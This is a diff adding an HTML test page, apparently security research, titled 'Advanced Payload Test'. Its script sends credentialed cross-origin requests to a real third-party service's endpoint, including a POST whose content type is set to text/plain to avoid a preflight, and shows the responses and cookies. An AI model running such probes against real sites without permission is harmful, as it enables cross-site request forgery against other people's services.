@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test 3: Advanced Payload</title>
+</head>
+<body>
+    <h2>Advanced Payload Test</h2>
+    <div id="results"></div>
+    <script>
+    const results = document.getElementById('results');
+    
+    async function logResult(testName, result) {
+        results.innerHTML += `
+            <div style="margin: 10px; padding: 10px; border: 1px solid #ccc;">
+                <h3>${testName}</h3>
+                <pre>${JSON.stringify(result, null, 2)}</pre>
+            </div>
+        `;
+    }
+
+    async function runTests() {
+        // Test 1: OPTIONS preflight
+        try {
+            const preflightResponse = await fetch('https://perplexity.ai/cdn-cgi/rum', {
+                method: 'OPTIONS',
+                credentials: 'include',
+                headers: {
+                    'Access-Control-Request-Method': 'POST',
+                    'Origin': 'https://thunderanon.github.io'
+                }
+            });
+            logResult('Preflight Test', {
+                status: preflightResponse.status,
+                headers: [...preflightResponse.headers],
+                cookies: document.cookie
+            });
+        } catch (error) {
+            logResult('Preflight Test Error', {error: error.message});
+        }
+
+        // Test 2: POST with modified content-type
+        try {
+            const postResponse = await fetch('https://perplexity.ai/cdn-cgi/rum', {
+                method: 'POST',
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'text/plain',
+                    'Origin': 'https://thunderanon.github.io'
+                },
+                body: JSON.stringify({
+                    'eventType': 1,
+                    'memory': {
+                        'totalJSHeapSize': 11401845,
+                        'usedJSHeapSize': 7164829
+                    }
+                })
+            });
+            logResult('POST Test', {
+                status: postResponse.status,
+                headers: [...postResponse.headers],
+                cookies: document.cookie
+            });
+        } catch (error) {
+            logResult('POST Test Error', {error: error.message});
+        }
+    }
+    runTests();
+    </script>
+    <br>
+    <a href="index.html">Back to Main</a>
+</body>
+</html>
